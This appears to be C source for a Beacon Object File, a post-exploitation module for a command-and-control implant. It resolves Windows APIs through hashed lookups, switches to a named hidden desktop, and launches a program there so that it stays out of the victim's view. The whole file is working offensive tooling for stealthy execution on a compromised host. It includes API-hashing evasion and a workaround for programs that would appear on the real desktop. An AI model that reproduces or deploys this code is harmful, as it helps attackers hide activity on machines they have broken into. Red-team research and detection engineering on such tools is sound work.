#include "common.h"

typedef struct
{
    D_API( LdrLoadDll );
    D_API( RtlInitUnicodeString );
    D_API( CreateProcessA );
    D_API( GetThreadDesktop );
    D_API( SetThreadDesktop );
    D_API( OpenDesktopA );
    D_API( GetCurrentThreadId );
    D_API( CloseDesktop );
    D_API( SearchPathA );
    D_API( GetWindowsDirectoryA );

} API, *PAPI;

VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc ) 
{
    API                 Api;
    UNICODE_STRING      Uni;
    DATAP               Parser;

    HANDLE              hNtdll = NULL;
    HANDLE              hKernel32 = NULL;
    HANDLE              hUser32 = NULL;
    
    PCHAR               DesktopName = NULL;
    HDESK               hDesk = NULL;
    HDESK               hOldDesk = NULL;

    PCHAR               Command = NULL;
    PCHAR               Arguments = NULL;

    BOOL                proc = FALSE;
    STARTUPINFOA        startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };


    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    hNtdll = FindModule( H_LIB_NTDLL, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hNtdll == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find ntdll.dll" );
        goto cleanup;
    };

    Api.LdrLoadDll = FindFunction( hNtdll, H_API_LDRLOADDLL );
    Api.RtlInitUnicodeString = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
    if( Api.LdrLoadDll == NULL || Api.RtlInitUnicodeString == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find init functions" );
        goto cleanup;
    };

    hKernel32 = FindModule( H_LIB_KERNEL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hKernel32 == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find kernel32.dll" );
        goto cleanup;
    };

    hUser32 = FindModule( H_LIB_USER32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hUser32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( L"user32.dll" ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &hUser32 );
        RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    };

    Api.CreateProcessA = FindFunction( hKernel32, H_API_CREATEPROCESSA );
    Api.GetCurrentThreadId = FindFunction( hKernel32, H_API_GETCURRENTTHREADID );
    Api.SearchPathA = FindFunction( hKernel32, H_API_SEARCHPATHA );
    Api.GetWindowsDirectoryA = FindFunction( hKernel32, H_API_GETWINDOWSDIRECTORYA );
    Api.GetThreadDesktop = FindFunction( hUser32, H_API_GETTHREADDESKTOP );
    Api.SetThreadDesktop = FindFunction( hUser32, H_API_SETTHREADDESKTOP );
    Api.OpenDesktopA = FindFunction( hUser32, H_API_OPENDESKTOPA );
    Api.CloseDesktop = FindFunction( hUser32, H_API_CLOSEDESKTOP );

    if( !Api.CreateProcessA ||
        !Api.GetCurrentThreadId ||
        !Api.SearchPathA ||
        !Api.GetWindowsDirectoryA ||
        !Api.GetThreadDesktop ||
        !Api.SetThreadDesktop ||
        !Api.OpenDesktopA ||
        !Api.CloseDesktop )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to find required functions" );
        goto cleanup;
    };

    BeaconApi->BeaconDataParse( &Parser, Argv, Argc );

    DesktopName = BeaconApi->BeaconDataExtract( &Parser, NULL );
    if( DesktopName == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get desktop name" );
        return;
    };

    Command = BeaconApi->BeaconDataExtract( &Parser, NULL );
    if( Command == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get command" );
        return;
    };

    Arguments = BeaconApi->BeaconDataExtract( &Parser, NULL );
    if( Arguments == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get arguments" );
        return;
    };
    if( Arguments[0] == 'N' && Arguments[1] == 'A' && Arguments[2] == '\0' )
    {
        Arguments = NULL;
    };

    hOldDesk = Api.GetThreadDesktop( Api.GetCurrentThreadId() );
    if( hOldDesk == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to get original desktop" );
        goto cleanup;
    };

    hDesk = Api.OpenDesktopA( DesktopName, 0, TRUE, GENERIC_ALL );
    if( hDesk == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to open desktop" );
        goto cleanup;
    };

    if( !Api.SetThreadDesktop( hDesk ) )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to set desktop" );
        goto cleanup;
    };

    /* CreateProcessA(appName="notepad") does not search PATH. Build a writable command line. */
    {
        CHAR line[MAX_PATH * 2];
        CHAR resolved[MAX_PATH];
        RtlSecureZeroMemory( line, sizeof( line ) );
        RtlSecureZeroMemory( resolved, sizeof( resolved ) );

        if( Api.SearchPathA( NULL, Command, ".exe", MAX_PATH, resolved, NULL ) == 0 )
        {
            Api.GetWindowsDirectoryA( resolved, MAX_PATH );
            strcatA( resolved, "\\System32\\" );
            strcatA( resolved, Command );
        };

        strcpyA( line, resolved );
        if( Arguments != NULL )
        {
            strcatA( line, " " );
            strcatA( line, Arguments );
        };

        /* Win10 calc.exe is a UWP stub — always lands on the interactive desktop. */
        {
            PCHAR c = Command;
            if( ( c[0] == 'c' || c[0] == 'C' ) && ( c[1] == 'a' || c[1] == 'A' ) && ( c[2] == 'l' || c[2] == 'L' ) && ( c[3] == 'c' || c[3] == 'C' ) )
            {
                BeaconApi->BeaconPrintf( CALLBACK_ERROR, "calc is UWP on Win10 — shows on the real desktop. Use: hd-launch mspaint / notepad / write" );
                goto cleanup;
            };
        };

        startupInfo.cb = sizeof( startupInfo );
        startupInfo.dwFlags = STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_SHOW;
        startupInfo.lpDesktop = DesktopName;
        proc = Api.CreateProcessA( NULL, line, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo );
        if( proc == FALSE )
        {
            CHAR winsta[256];
            RtlSecureZeroMemory( winsta, sizeof( winsta ) );
            strcpyA( winsta, "WinSta0\\" );
            strcatA( winsta, DesktopName );
            startupInfo.lpDesktop = winsta;
            proc = Api.CreateProcessA( NULL, line, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo );
        };
        if( proc == FALSE )
        {
            BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to create process" );
            goto cleanup;
        };
        BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, "Launched %s on hidden desktop", resolved );
    };

cleanup:
    if( hOldDesk )
    {
        if( !Api.SetThreadDesktop( hOldDesk ) )
        {
            BeaconApi->BeaconPrintf( CALLBACK_ERROR, "Failed to restore desktop" );
        };

         Api.CloseDesktop( hOldDesk );
    };

    if( hDesk )
    {
        Api.CloseDesktop( hDesk );
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( UNICODE_STRING ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    return;
};

VOID go( PVOID Argv, INT Argc )
{
    BAPI_TABLE Api;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    Api.BeaconInjectProcess = C_PTR( BeaconInjectProcess );
    Api.BeaconDataExtract   = C_PTR( BeaconDataExtract );
    Api.BeaconDataParse     = C_PTR( BeaconDataParse );
    Api.BeaconDataShort     = C_PTR( BeaconDataShort );
    Api.BeaconIsAdmin       = C_PTR( BeaconIsAdmin );
    Api.BeaconPrintf        = C_PTR( BeaconPrintf );

    BofMain( &Api, Argv, Argc );
};
